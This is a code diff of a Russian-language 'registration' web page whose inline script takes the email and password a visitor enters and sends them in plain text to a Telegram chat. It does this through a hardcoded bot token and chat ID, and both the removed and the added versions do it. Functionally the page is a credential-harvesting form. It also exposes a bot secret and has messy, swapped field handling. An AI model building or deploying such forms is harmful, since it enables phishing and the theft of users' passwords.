@@ -23,41 +23,45 @@
 <body>
     <h1>Регистрация</h1>
     <form id="registrationForm">
-        <p>Email</p>
+        <p></p>
+        <label for="text">Email</label>
         <input type="text" id="email" name="username" required>
         <br>
-        <p>Password</p>
+        <p></p>
+        <label for="text">Password</label>
         <input type="text" id="pass" name="email" required>
         <br>
         <button type="submit">Зарегистрироваться</button>
     </form>
 
     <script>
-        document.getElementById('registrationForm').addEventListener('submit', function(event) {
-            event.preventDefault(); 
-
-            const username = document.getElementById('pass').value;
-            const email = document.getElementById('email').value;
-
-            const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
-            const chatId = -1002372284940 
-            const message = `Новая регистрация:\nПароль: ${username}\nПочта: ${email}`;
-            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-
-           
-            fetch(url) 
-                .then(response => {
-                    if (response) {
-                      preventDefault()
-                        alert('Данные успешно отправлены в Telegram!');
-                    } else {
-                        alert('Ошибка при отправке данных.');
-                    }
-                })
-                .catch(error => {
-                    console.error('Ошибка:', error);
-                    alert('Ошибка при отправке данных.');
-                });
+        const form = document.getElementById('registrationForm')
+        
+        let submit = addEventListener('submit', e => {
+          e.preventDefault() 
+          
+          const username = document.getElementById('pass').value;
+          const email = document.getElementById('email').value;
+          
+          const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
+          const chatId = -1002372284940 
+          const message = `Новая регистрация:\n Почта${email}\n Пароль${username}`;
+          const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+          
+          
+          fetch(url) 
+          .then(response => {
+            if (response) {
+              
+              alert('Данные успешно отправлены в Telegram!');
+            } else {
+              console.log('error');
+            }
+          })
+          .catch(error => {
+            console.error('Ошибка:', error);
+            alert('Ошибка при отправке данных.');
+          });
         });
     </script>
 </body>
